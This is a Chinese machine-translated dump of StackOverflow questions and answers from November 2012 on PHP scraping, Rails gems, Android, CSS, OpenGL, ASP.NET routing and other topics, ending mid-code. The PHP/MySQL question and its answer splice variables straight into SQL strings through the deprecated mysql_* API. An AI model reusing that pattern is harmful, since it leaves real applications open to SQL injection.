# StackOverflow 问答 13548000-13548999

# php - 解析脚本没有推出

> ID：13548000
> 
> 赞同：1
> 
> 时间：2012-11-25T03:27:54.607
> 
> 标签：php, parsing, screen-scraping

```
<?

$file = "http://www.google.com";
$doc = new DOMDocument();
echo @$doc->loadHTML(file_get_contents($file));

$element = $doc->getElementsbyTagName('span');

echo trim($element->item(0)->nodeValue);
echo trim($element->item(0)->textContent);

if (!is_null($element)) {
        $content = $element->nodeValue;

        if (empty($content)) {
            $content = $element->textContent;

           }

            echo $content . "\n";
        }

?> 
```

我正在尝试测试这个脚本，我想知道为什么我不能解析谷歌？如果您查看源页面，在 span 中按 ctrl+f 类型，显然有一个 span 标签。为什么不给我结果？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T03:40:53.497

```
<?php

$file = 'http://www.google.com';
$doc = new DOMDocument();
@ $doc->loadHTML(file_get_contents($file));

$element = $doc->getElementsByTagName('span');

if (0 != $element->length) 
{
    $content = trim($element->item(0)->nodeValue);
    if (empty($content)) 
    {
        $content = trim($element->item(0)->textContent);
    }
    echo $content . "\n";
}

?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T06:04:57.333

不是 100% 确定，但不需要在 php.ini 中启用 allow_url_fopen 才能使其工作？

代码已删除

# binary - 棘手的二进制乘法

> ID：13548001
> 
> 赞同：1
> 
> 时间：2012-11-25T03:28:09.210
> 
> 标签：binary, multiplication

我试图将二进制 1111 作为第一个输入，将 1111 作为第二个输入。当我像往常一样乘法时，我遇到了必须在下面进行加法时遇到必须将 1 与三个 1 一起携带，这意味着二进制中的 4 和 2 位。但是对于这个乘法问题，这是不可能用 2 位来表示 4 的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T04:07:27.593

如果您想添加多个二进制值，那么您只需携带添加一列后剩下的任何内容，而不管您需要多少位来表示进位。

就像做小数加 99+99+99+99+99+99+99+99+99+99+99+99 一样，当添加最低有效列时，你最终得到 108，所以你携带 10 即使它是太大而无法容纳一个数字。

同样，如果您添加二进制 11+11+11+11+11，则在添加最低有效列时您最终会得到 101，因此您携带 10。

但是，通常您一次只添加两个二进制数，因为这样您就可以避免使用单个位进行进位。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T03:33:45.110

你所要做的就是将这些数字放在另一个数字上。

拿情景：11+11+11

* * *

你会得到 1001 作为你的答案，因为二进制中的 4 是 100。只需将 1 转移到正确的位置。

# ruby-on-rails - Rails 即使在开发模式下也会压缩资源

> ID：13548003
> 
> 赞同：1
> 
> 时间：2012-11-25T03:29:10.587
> 
> 标签：ruby-on-rails, ruby-on-rails-3, asset-pipeline, assets

Rails 只是在开发模式下压缩 javascript，但我不需要。这是 config/environments/development.rb

```
# Do not compress assets
config.assets.compress = false

# Expands the lines which load the assets
config.assets.debug = true 
```

Rails 版本是 3.2.8，但也尝试了 3.2.9-rc3，3.1.8 不适用于我的应用程序，因为它是在 3.2.8 中创建的

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T17:40:35.710

我刚刚发现 Rails 提供预编译的资产，而不是 app/ 目录中的资产（当它们存在时）。它需要删除它们以使 Rails 像我需要的那样工作。

```
rake assets:clean 
```

我相信 Rails 在开发模式下不能那样做。

# ruby - 无法安装 ruby gem "yajl-ruby"

> ID：13548007
> 
> 赞同：2
> 
> 时间：2012-11-25T03:29:55.997
> 
> 标签：ruby, gem, yajl

我正在尝试安装 ruby​​ gem“yajl ruby​​”。我正在运行 Mac OS 10.7.4 和 Ruby 1.8.7（2011-12-28 补丁级别 357）[universal-darwin11.0]。当我运行时：

```
sudo gem install yajl-ruby 
```

我得到以下输出：

```
Building native extensions.  This could take a while...
ERROR:  Error installing yajl-ruby:
    ERROR: Failed to build gem native extension.

        /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/bin/ruby extconf.rb
creating Makefile

make
gcc -I. -    I/System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/1.8/universal-darwin11.0     -I/System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/1.8/universal-darwin11.0     -I. -D_XOPEN_SOURCE -D_DARWIN_C_SOURCE   -fno-common -arch i386 -arch x86_64 -g -Os -pipe -    fno-common -DENABLE_DTRACE  -fno-common  -pipe -fno-common  -Wall -funroll-loops  -c yajl.c
make: gcc: No such file or directory
make: *** [yajl.o] Error 1

Gem files will remain installed in /Library/Ruby/Gems/1.8/gems/yajl-ruby-1.1.0 for     inspection.
Results logged to /Library/Ruby/Gems/1.8/gems/yajl-ruby-1.1.0/ext/yajl/gem_make.out 
```

为了使安装工作，我需要做什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-03T06:12:05.780

尝试这个：

`$ sudo ln -s /usr/bin/llvm-gcc /usr/bin/gcc-4.2`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-14T23:41:28.600

我在安装 yajl-ruby 时遇到了类似的错误。

错误是 /Developer/usr/bin 不可用。执行“ln -s /Applications/Xcode.app/Contents/Developer/usr//Developer/usr”修复了错误。

这是我看到的具体错误：

```
 gem install yajl-ruby
Building native extensions.  This could take a while...
ERROR:  Error installing yajl-ruby:
    ERROR: Failed to build gem native extension.

/System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/bin/ruby extconf.rb
creating Makefile

make
xcrun cc -I. -I/System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/1.8/universal-darwin11.0 -I/System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/1.8/universal-darwin11.0 -I. -D_XOPEN_SOURCE -D_DARWIN_C_SOURCE   -fno-common -arch i386 -arch x86_64 -g -Os -pipe -fno-common -DENABLE_DTRACE  -fno-common  -pipe -fno-common  -Wall -funroll-loops  -c yajl.c
sh: /Developer/usr/bin/xcodebuild: No such file or directory
/Developer/usr/bin/xcodebuild fails with 32512 - Unknown error: 32512
make: *** [yajl.o] Error 69

Gem files will remain installed in /Library/Ruby/Gems/1.8/gems/yajl-ruby-1.1.0 for inspection.
Results logged to /Library/Ruby/Gems/1.8/gems/yajl-ruby-1.1.0/ext/yajl/gem_make.out 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-25T16:11:43.787

这有点迂回，但您是否考虑过使用[RVM](https://rvm.io/)来管理您的 Ruby 版本？由于您正在使用 OS X 机器，我假设它是您的开发机器，因此拥有系统范围的 gem 可能没什么大不了的。RVM 将安装 gems 的路径更改为相对于正在使用的 Ruby 版本，并且由于路径是用户目录的本地路径，因此您不需要使用 sudo 从而避免潜在的权限错误，这是我怀疑发生在这里.

我说我怀疑这是一个权限错误，因为丢失的文件表明某些内容没有写入预期的位置。不过，这只是在黑暗中开枪。或者，您可以尝试实际使用 root 并在那里进行 gem 安装，但这很难看。

# php - MySQL、PHP 和多表

> ID：13548008
> 
> 赞同：1
> 
> 时间：2012-11-25T03:30:37.103
> 
> 标签：php, mysql

我试图从一个mysql表中获取一组值，然后在另一个表中搜索这些值并从中提取数据。想象两个表：一个订单表（id，product_id）和一个产品表（id，price）。我基本上是在尝试使用一个充满 orders.id 的数组来对数组中这些 id 的 products.price 求和。

我已经想出了如何使用 PHP 在 PHP 中获取充满 orders.id 的数组

```
 $results = mysql_query("SELECT id FROM orders WHERE some_value =" . $passed_value . "");
    while ($row = mysql_fetch_row($results))
      {
        $results_array[] = $row[0]; 
      } 
```

所以问题是，既然我有了那个数组，我如何使用它在另一个表中搜索数组中的任何 id，然后从该行中提取数据。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T03:36:23.903

您可以使用`$results_array`获取产品 ID，然后像使用`$results_array['product_id']`.

然而，这是非常低效的。正确的方法是执行 SQL 连接或简单的联合查询，如下所示：

```
SELECT orders.id, orders.product_id, products.price 
FROM orders, products 
WHERE orders.id = '" . $your_order_id . "' and products.id = orders.product_id 
```

结果行将包含您需要的两个表中的所有信息。

**更新：更多信息**

当使用`Where`子句隐式连接时，它实际上是一个内部连接。即，当两个表中至少有一个匹配时，它会返回行。另一方面，左连接会返回第一个表中的所有行，即使第二个表中没有匹配的行（在这种情况下，您会得到与第二个表对应的各个字段为空）。

因此，与性能相比（这更多地取决于您在字段上拥有的索引，尽管连接类型可能会产生一些影响），您选择的内容取决于您想要获得的结果。您可能想查看[这里](http://www.w3schools.com/sql/sql_join.asp)（确保您阅读了有关连接的连续 5 页）以获得全面的理解。

# android - 锁定安卓活动

> ID：13548009
> 
> 赞同：0
> 
> 时间：2012-11-25T03:30:38.277
> 
> 标签：android, android-activity

我正在开发一个使用登录活动如何主要活动的android应用程序。当用户登录时，应用程序显示其他活动（意图），但如果用户按下按钮，应用程序显示登录的主要活动。¿ 在应用程序中登录后如何锁定登录活动？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T03:34:59.877

如果要阻止用户返回登录活动，有两种方法：

1.  登录成功后，`finish()`在启动主Activity后就可以简单的调用登录Activity了。这将结束登录活动，因此当用户按下后退按钮时，应用程序就会完成。
2.  让主要活动成为应用程序的启动活动。在`onCreate`中，您可以调用`startActivityForResult()`并启动您的登录活动。当登录活动完成时，如果登录成功，主要活动可以正常进行，或者`finish()`如果用户登录失败（或在受限模式下运行）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T03:33:51.250

`finish();` 切换到另一个班级后使用 。
例子 ：

```
Intent newIntent = new Intent (firstActivity.this, afterLogin.class)
    startActivity(newIntent);
    finish(); 
```

# url - 为什么使用'/'而不是其他字符进行路由

> ID：13548013
> 
> 赞同：1
> 
> 时间：2012-11-25T03:31:27.203
> 
> 标签：url, web, routing, routes

就网络的路由 url 而言，使用字符`/`分隔路由 url 是标准做法。

前任：

```
www.example.com/i/like/programming 
```

是否有特定原因，例如搜索引擎优化，这是生成 url 的标准方式？

然而，也很容易实现这样的路由模式，尤其是像*Symfony2*或*Zend这样的框架：*

```
www.example.com/i<>like<>programming 
```

我想知道为什么不（或不应该）使用特殊字符代替字符的具体原因`/`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-25T03:35:27.290

该约定称为统一资源定位器。[维基百科在这里](http://en.wikipedia.org/wiki/Uniform_resource_locator)有一篇很棒的文章

# vb.net - 表单元素顺序

> ID：13548015
> 
> 赞同：0
> 
> 时间：2012-11-25T03:32:17.227
> 
> 标签：vb.net, visual-studio-2010

我在`PictureBox`元素上添加了一个标签，因为 PictureBox 在加载时会动态调整大小（在这种情况下它加载什么不是很重要）......问题是标签位于图片框元素下，并且不可见当图片框在他们上方时。

是否有任何解决方案可以将标签显示顺序设置为可用的顶部？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T03:35:49.327

您可以使用[BringToFront](http://msdn.microsoft.com/en-us/library/system.windows.forms.control.bringtofront.aspx)方法。

```
label1.BringToFront() 
```

# html - CSS渐变停止然后重复

> ID：13548018
> 
> 赞同：1
> 
> 时间：2012-11-25T03:33:00.200
> 
> 标签：html, css

我想让我网站上的背景变成渐变色。这是因为我刚刚开始制作网站，我只想了解 CSS 是如何工作的，什么不是。

这是我的代码：

```
background-image: -moz-linear-gradient(top, rgba(0, 0, 0, 0) 0%, rgba(0, 0, 0, 0.65) 100%); /* FF3.6+ */
background-image: -webkit-gradient(linear, left top, left bottom, color-stop(0%, rgba(0, 0, 0, 0)), color-stop(100%, rgba(0, 0, 0, 0.65))); /* Chrome,Safari4+ */
background-image: -webkit-linear-gradient(top, rgba(0, 0, 0, .8) 0%, rgba(0, 0, 0, 0.65) 100%); /* Chrome10+,Safari5.1+ */
background-image: -o-linear-gradient(top, rgba(0, 0, 0, 0) 0%, rgba(0, 0, 0, 0.65) 100%); /* Opera 11.10+ */
background-image: -ms-linear-gradient(top, rgba(0, 0, 0, 0) 0%, rgba(0, 0, 0, 0.65) 100%); /* IE10+ */
background-image: linear-gradient(to bottom, rgba(0, 0, 0, 0) 0%, rgba(0, 0, 0, 0.65) 100%); /* W3C */
filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#00000000', endColorstr='#a6000000',GradientType=0 ); /* IE6-9 */ 
```

我不希望渐变停止然后从白色重复。我希望渐变根据当前媒体的大小而变化。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T03:46:00.200

将html`height`和`width`body 的 and 设置为 100%，这些选项用于背景：

```
background-repeat: no-repeat;
background-attachment: fixed; 
```

[演示](http://codepen.io/anon/pen/EAmau)

如果你不这样做，当你滚动超过浏览器的高度时，渐变会重复。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T03:43:12.310

这是您需要做的，将 height:100% 应用于 html 和 body。如果您的网站将在移动设备上，您需要添加

background-attachment：也固定在身体上。

```
 html{
 height: 100%;
 }
 body{
 height: 100%;
 background-image: -moz-linear-gradient(top, rgba(0, 0, 0, 0) 100%, rgba(0, 0, 0, 0.65) 100%); /* FF3.6+ */
background-image: -webkit-gradient(linear, left top, left bottom, color-stop(100%, rgba(0, 0, 0, 0)), color-stop(100%, rgba(0, 0, 0, 0.65))); /* Chrome,Safari4+ */
 background-image: -webkit-linear-gradient(top, rgba(0, 0, 0, .8) 0%, rgba(0, 0, 0, 0.65) 100%); /* Chrome10+,Safari5.1+ */
  background-image: -o-linear-gradient(top, rgba(0, 0, 0, 0) 100%, rgba(0, 0, 0, 0.65) 100%); /* Opera 11.10+ */
 background-image: -ms-linear-gradient(top, rgba(0, 0, 0, 0) 100%, rgba(0, 0, 0, 0.65) 100%); /* IE10+ */
 background-image: linear-gradient(to bottom, rgba(0, 0, 0, 0) 0%, rgba(0, 0, 0, 0.65) 100%); /* W3C */
 filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#00000000', endColorstr='#a6000000',GradientType=0 ); /* IE6-9 */} 
```

# android - Matrix.setLookAtM 方法在 OpenGL ES 中如何工作？

> ID：13548020
> 
> 赞同：13
> 
> 时间：2012-11-25T03:33:11.400
> 
> 标签：android, opengl-es

如何`Matrix.setLookAtM`工作？我一直在寻找，找不到解释。我知道前三个坐标是定义相机在世界空间中的位置，我认为“视图中心”是指`x, y, z`我在世界空间中看到的坐标。既然如此，“向上向量”是什么意思/做什么？

如果有之前我忽略的问题或教程，我很乐意接受。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-11-25T04:37:41.323

向上向量是相机认为“向上”的内容，即：如果您向前看并举起手，那就是您的“向上”向量。只需将其设置为`0, 1, 0`. 我不是 Android 开发人员，但我猜它类似于`gluLookAt()`.

这个函数真正做的是为你设置一个视图矩阵。它需要眼睛的位置来确定相机的位置。之后，它将从中心减去眼睛位置并对其进行归一化以获得前向向量。然后它将前向向量与上向量交叉，得到一个右向量。在对所有三个进行归一化之后，它可以从这些`x, y, z`向量构造一个矩阵，为您提供一个基本的模型视图矩阵。

它只是为您离散数学。

# script# - 既然 AlternateSignature 消失了，我如何在 scriptsharp 中重载方法？

> ID：13548023
> 
> 赞同：0
> 
> 时间：2012-11-25T03:33:59.113
> 
> 标签：script#

1.  过去，我使用 AlternateSignature 来重载方法，但在当前的开发版本（0.8）中，您如何重载方法？

2.  是否可以重载构造函数？

3.  我可能在发行说明或论坛中遗漏了一些东西，所以请告诉我你是如何发现重载方法的新方法的。这样我就知道将来该往哪里看。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-01T17:33:59.503

1.  只需做与以前相同的事情，但不使用 AlternateSignature 进行注释。见[https://github.com/nikhilk/scriptsharp/blob/cc/tests/TestCases/Member/Overloads/Code.cs](https://github.com/nikhilk/scriptsharp/blob/cc/tests/TestCases/Member/Overloads/Code.cs)

2.  查看相同的测试用例。

3.  有关正在进行的更改列表，请参阅[https://github.com/nikhilk/scriptsharp/blob/cc/History.txt](https://github.com/nikhilk/scriptsharp/blob/cc/History.txt)。正如您将在此处观察到的，测试用例还有助于说明各种功能。

希望有帮助。

# c# - 这样的路由可以在 MVC 4.0 中完成吗

> ID：13548024
> 
> 赞同：2
> 
> 时间：2012-11-25T03:34:23.343
> 
> 标签：c#, asp.net-mvc-4

我可以将路径配置为：

```
 routes.MapRoute(
        name: "Default",
        url: "{id}.zeko.com",
        defaults: new { controller = "App",
                        action = "GetDetailsById", 
                        id = UrlParameter.Optional
                      }
               ); 
```

我希望 id 作为我的方法的参数。告诉我我哪里错了？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-21T17:02:14.627

好的，我自己想出来了……只是我们必须在创建每个 id 后泄露我们获得的域。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T06:29:41.920

我不完全确定这是可能的。我相信 MVC 中的路由引擎默认不处理域请求。您可以做的是添加一个事先处理请求的 IIS 处理程序，或者我在 Web 窗体中所做的（我不确定您将如何在 MVC 中完成此操作）是调用一个方法来去除我的子域**“Page_Load”**方法，然后根据需要使用该变量。下面是我使用的函数示例，请记住，我的应用程序只希望使用单个子域，例如**"subdomain.maindomain.com"**：

```
private static string GetSubDomain(Uri url)
    {
        try
        {
            string host = url.Host;
            if (host.Split('.').Length > 2)
            {
                int firstIndex = host.IndexOf(".");
                string subdomain = host.Substring(0, firstIndex);

                return subdomain;
            }
        }
        catch
        {

        }

        return string.Empty;
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-25T06:35:44.253

我为您找到了这篇文章，但是它需要提前了解每个可能的子域，因为我之前的回答允许动态子域。希望这些有所帮助！

[是否可以基于子域创建 ASP.NET MVC 路由？](https://stackoverflow.com/questions/278668/is-it-possible-to-make-an-asp-net-mvc-route-based-on-a-subdomain)

# mongodb - mongodb中的复合索引在哪里发挥作用

> ID：13548025
> 
> 赞同：0
> 
> 时间：2012-11-25T03:34:31.170
> 
> 标签：mongodb, indexing, mongodb-indexes

我们从复合索引中获得了哪些优势。我的意思是假设我们有一个集合，我必须在其中索引 2 个字段，比如`key1`和`key2`。它与复合索引 { `key1`:1, `key2`:1} 有什么不同。有 2 个单独的索引有什么问题。mongodb 不能使用 2 个或更多索引来满足查询。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T03:56:37.653

在 MongoDB 2.2 中：

> 每个查询，包括更新操作，都使用一个且仅一个索引。查询优化器通过偶尔运行备用查询计划并通过为每种查询类型选择具有最佳响应时间的计划来凭经验选择索引。

上述规则的一个例外是[`$or`查询](http://docs.mongodb.org/manual/reference/operator/or/)；每个子句并行执行，可以使用单独的索引。

有关更多信息，请参阅：

*   [索引概述](http://docs.mongodb.org/manual/core/indexes/)
*   [查询优化器](http://www.mongodb.org/display/DOCS/Query+Optimizer)
*   [解释](http://www.mongodb.org/display/DOCS/Explain)

# c# - 选中复选框时如何将值放入数组？C＃？

> ID：13548026
> 
> 赞同：0
> 
> 时间：2012-11-25T03:34:53.677
> 
> 标签：c#, winforms, checkbox

我正在制作一个随机字符生成器，​​我有 2 个表单，form1 和 form2，在我的 form2 上我有复选框，所以如果用户选中了 checkbox1，在我的 form1 上它只会显示 1 个字符，现在如果用户检查所有 5复选框，我的 form1 将生成 5 个字符。我在 form1 上有一个按钮，它将触发生成随机字符的事件。

字符：'+','-','*','/','%'

我的代码将如何？我正在使用 WINDOWS 表单应用程序。

图片在这里： form1： http: [//i49.tinypic.com/30bzos8.png](http://i49.tinypic.com/30bzos8.png) form2：http: [//i50.tinypic.com/k00ndt.png](http://i50.tinypic.com/k00ndt.png)

```
 char[] select = new char[] { '+' , '-' , '*' , '/', '%' };
        var rand = new Random();
        char num = select[rand.Next(5)]; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T05:00:54.910

这种情况总是很有趣，因为我们不知道你在课堂上学过什么或没学过什么。因此，根据我上面的评论，您似乎给出了相互矛盾的答案，我将假设 Form2 是在 Form1 的构造函数中创建的，就像这样。您将需要某种方法来确定检查了哪些 Combobox，我只是对二进制值进行异或运算，正如我在评论中所说，我将使用 ShowDialog 启动 Form2 并查看返回值以确定是退出还是继续。我会给你一个快速而肮脏的例子，由你来充实它。如果不是这种情况，您将需要发布更多代码

**表格1**

```
public partial class Form1 : Form
{
    char[] operators;

    public Form1()
    {
        InitializeComponent();
        Form2 frm2 = new Form2();
        if (frm2.ShowDialog() == DialogResult.OK) //Check for DialogResult Here
        {
            operators = CreateArray(frm2.GetOperators); // Get ComboBox Values from Form2 and Process them
            frm2.Close();                  // Close Form2
        }
        else
            Application.Exit();           // If DialogResult is not OK then exit Form
    }

    private char[] CreateArray( int value)
    {
        string num = "";
        if ((value & 1) == 1)
            num += "+";
        if ((value & 2) == 2)
            num += "-";
        if ((value & 4) == 4)
            num += "*";
        if ((value & 8) == 8)
            num += "/";
        if ((value & 16) == 16)
            num += "%";

        return num.ToCharArray();
    }
} 
```

**表格2**

```
public partial class Form2 : Form
{
    int operators;
    public Form2()
    {
        InitializeComponent();
    }

    private void checkBox_CheckedChanged(object sender, EventArgs e)
    {
        CheckBox cb = (CheckBox)sender;
        //Method that I used for determining CheckBox State. You can use a boolean array or an Enumeration ....
        if (cb.Text == "Addition")
            operators = operators ^ 1;
        else if (cb.Text == "Subtraction")
            operators = operators ^ 2;
        else if (cb.Text == "Multiplication")
            operators = operators ^ 4;
        else if (cb.Text == "Division")
            operators = operators ^ 8;
        else if (cb.Text == "Modulus")
            operators = operators ^ 16;

    }
    public  int GetOperators       //Property for return value to Form1
    {
        get { return operators; }
    }
} 
```

# java - 在 Freemarker 模板中编码 base64

> ID：13548034
> 
> 赞同：5
> 
> 时间：2012-11-25T03:35:52.757
> 
> 标签：java, base64, freemarker

有没有办法在 Freemarker 模板中将字节数组转换为 base64？就像是：

```
<img src="data:image/jpeg;base64,${photo.data?base64}" /> 
```

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T07:54:42.747

当前版本中没有内置方法。（当然你可以调用你自己的方法来做到这一点。）

您要调用其方法的对象必须放入数据模型（即模板上下文）中。（对于静态：[freemarker.org/docs/pgui_misc_beanwrapper.html#autoid_55](http://freemarker.org/docs/pgui_misc_beanwrapper.html#autoid_55)）

但是，为了更容易维护，我更喜欢这样：创建类`com.foo.Base64EncoderMethod implements TemplateMethodModelEx`（在内部调用`Base64.encodeBase64`），然后创建一个模板`lib/utils.ftl`（如果你还没有类似的东西），然后调用`<#assign base64Encode = 'com.foo.Base64EncoderMethod'?new()>`. 然后在模板中，调用`<#import '/lib/utils.ftl' as u>`和`${u.base64Encode(photo.data)}`

# ruby-on-rails - 安装 sqlite3 时出现将 rails 应用程序推送到 Heroku 错误，并且 Bundler 无法继续

> ID：13548040
> 
> 赞同：12
> 
> 时间：2012-11-25T03:37:39.373
> 
> 标签：ruby-on-rails, deployment, heroku, sqlite

我试图将我的 rails 应用程序推送到 heroku 并收到如下错误：

-

```
 Counting objects: 177, done. Delta compression using up to 2 threads.
   Compressing objects: 100% (161/161), done. Writing objects: 100%
   (177/177), 44.73 KiB, done. Total 177 (delta 39), reused 0 (delta 0)

   -----> Heroku receiving push
   -----> Ruby/Rails app detected
   -----> Installing dependencies using Bundler version 1.2.1
          Running: bundle install --without development:test --path vendor/bundle -
   -binstubs bin/
          Fetching gem metadata from 
          Fetching gem metadata from 
          Installing rake (10.0.2)
          Installing i18n (0.6.1)
          Installing multi_json (1.3.7)
          Installing activesupport (3.2.8)
          Installing builder (3.0.4)
          Installing activemodel (3.2.8)
          Installing erubis (2.7.0)
          Installing journey (1.0.4)
          Installing rack (1.4.1)
          Installing rack-cache (1.2)
          Installing rack-test (0.6.2)
          Installing hike (1.2.1)
          Installing tilt (1.3.3)
          Installing sprockets (2.1.3)
          Installing actionpack (3.2.8)
          Installing mime-types (1.19)
          Installing polyglot (0.3.3)
          Installing treetop (1.4.12)
          Installing mail (2.4.4)
          Installing actionmailer (3.2.8)
          Installing arel (3.0.2)
          Installing tzinfo (0.3.35)
          Installing activerecord (3.2.8)
          Installing activeresource (3.2.8)
          Using bundler (1.2.1)
          Installing coffee-script-source (1.4.0)
          Installing execjs (1.4.0)
          Installing coffee-script (2.2.0)
          Installing rack-ssl (1.3.2)
          Installing json (1.7.5) with native extensions
          Installing rdoc (3.12)
          Installing thor (0.16.0)
          Installing railties (3.2.8)
          Installing coffee-rails (3.2.2)
          Installing jquery-rails (2.1.3)
          Installing rails (3.2.8)
          Installing sass (3.2.3)
          Installing sass-rails (3.2.5)
          Installing sqlite3 (1.3.6) with native extensions
          Gem::Installer::ExtensionBuildError: ERROR: Failed to build gem native ex tension.
          /usr/local/bin/ruby extconf.rb
          checking for sqlite3.h... no
          sqlite3.h is missing. Try 'port install sqlite3 +universal'
          or 'yum install sqlite-devel' and check your shared library search path ( the
          location where your sqlite3 shared library is located).
          *** extconf.rb failed ***
          Could not create Makefile due to some reason, probably lack of
          necessary libraries and/or headers.  Check the mkmf.log file for more
          details.  You may need configuration options.
          Provided configuration options:
          --with-opt-dir
          --without-opt-dir
          --with-opt-include
          --without-opt-include=${opt-dir}/include
          --with-opt-lib
          --without-opt-lib=${opt-dir}/lib
          --with-make-prog
          --without-make-prog
          --srcdir=.
          --curdir
          --ruby=/usr/local/bin/ruby
          --with-sqlite3-dir
          --without-sqlite3-dir
          --with-sqlite3-include
          --without-sqlite3-include=${sqlite3-dir}/include
          --with-sqlite3-lib
          --without-sqlite3-lib=${sqlite3-dir}/lib
          --enable-local
          --disable-local
          Gem files will remain installed in /tmp/build_2pense1pvyqut/vendor/bundle /ruby/1.9.1/gems/sqlite3-1.3.6
   for inspection.
          Results logged to /tmp/build_2pense1pvyqut/vendor/bundle/ruby/1.9.1/gems/
   sqlite3-1.3.6/ext/sqlite3/gem_make.out
          An error occurred while installing sqlite3 (1.3.6), and Bundler cannot co ntinue.
          Make sure that `gem install sqlite3 -v '1.3.6'` succeeds before bundling.

    !  !     Failed to install gems via Bundler.  !  !     Heroku push
   rejected, failed to compile Ruby/rails app 
```

==========================================

我的 GemFile 如下：

========================================

```
gem 'rails', '3.2.8'

   # Bundle edge Rails instead:
   # gem 'rails', :git => 'git://github.com/rails/rails.git' 

   group :production do    gem 'pg' end

   group :development, :test do   gem 'taps'   gem 'rvm'
        gem 'rspec-rails','2.0.1'   gem 'annotate'   gem 'faker','0.3.1'   gem 'rspec','2.0.1'   gem 'webrat','0.7.1'   gem 'spork','0.8.4'  
   gem 'factory_girl_rails','1.0' end

   gem 'rake', '~> 10.0.1'

   #gem 'yaml_db'

   # Gems used only for assets and not required
   # in production environments by default.   group :assets do   gem 'sass-rails',   '~> 3.2.3'   gem 'coffee-rails', '~> 3.2.1'

     # See https://github.com/sstephenson/execjs#readme for more
   supported runtimes   # gem 'therubyracer', :platforms => :ruby

     gem 'uglifier', '>= 1.0.3' end

   gem 'jquery-rails'

   # To use ActiveModel has_secure_password
   # gem 'bcrypt-ruby', '~> 3.0.0'

   # To use Jbuilder templates for JSON
   # gem 'jbuilder'

   # Use unicorn as the app server
   # gem 'unicorn'

   # Deploy with Capistrano
   # gem 'capistrano'

   # To use debugger
   # gem 'debugger' 
```

========================================

我尝试了几乎所有在线提供的解决方案，但仍然没有运气。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-11-25T16:03:11.573

我在上面的代码中没有看到它，但猜测你可能`gem 'sqlite3'`在 gemfile 的顶部有你的，所以它被用于所有环境。Heroku 不支持 Sqlite，因此它已被排除在生产组之外。尝试以下操作，以便您可以使用**sqlite**进行开发和测试，然后在 Heroku 上进行**pg 。**

```
group :development, :test do
  gem 'sqlite3'
end

group :production do
  gem 'pg'
end 
```

* * *

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2014-01-28T00:05:27.433

有同样的问题。意识到我没有将更改提交给 Git。一旦我提交它并将其重新推送到 Heroku，它就可以毫无问题地工作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-10-20T17:33:59.357

以下内容在我的 Mac 上为我工作：

`group :development, :test do gem 'sqlite3' end group :production do gem 'pg' end`

接着

`bundle install`

但这引发了这个错误：

`can't find the 'libpq-fe.h header *** extconf.rb failed ***`

使用 Homebrew 解决了这个错误，如此处所述 - [https://stackoverflow.com/a/20482221/2665896](https://stackoverflow.com/a/20482221/2665896)

IE

```
brew install postgresql
gem install pg 
```

然后将 Gemfile 和 Gemfile.lock 提交到本地 master。

然后`git push heroku master`像魅力一样工作。

# iphone - 模态视图的导航控制器

> ID：13548041
> 
> 赞同：0
> 
> 时间：2012-11-25T03:37:44.137
> 
> 标签：iphone, objective-c, ios, cocoa-touch, core-data

我有一个基于核心数据的项目，在导航控制器中嵌入了几个视图。在其中一个视图上，我有一个打开模式视图的按钮。问题是我必须手动将 a 添加`UINavigationBar`到视图中。这意味着它会随着我的表格视图滚动。我已经收集到消除此问题的方法是将视图嵌入导航控制器中。当我尝试这个时，当我尝试打开模式视图时应用程序崩溃并出现此错误：

```
 Terminating app due to uncaught exception 'NSInvalidArgumentException', reason: '-[UINavigationController setManagedObjectContext:] 
```

我的`applicationDidFinishLaunchingWithOptions`方法是通用核心数据应用程序的标准方法。

```
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    if ([[UIDevice currentDevice] userInterfaceIdiom] == UIUserInterfaceIdiomPad) {
        UISplitViewController *splitViewController = (UISplitViewController *)self.window.rootViewController;
        UINavigationController *navigationController = [splitViewController.viewControllers lastObject];
        splitViewController.delegate = (id)navigationController.topViewController;

        UINavigationController *masterNavigationController= [splitViewController.viewControllers objectAtIndex:0];
        GHiPadMasterViewController *controller = (GHiPadMasterViewController *)masterNavigationController.topViewController;
        controller.managedObjectContext = self.managedObjectContext;
    }
    else {
        UINavigationController *navigationController = (UINavigationController *)self.window.rootViewController;
        GHMasterViewController *controller = (GHMasterViewController *)navigationController.topViewController;
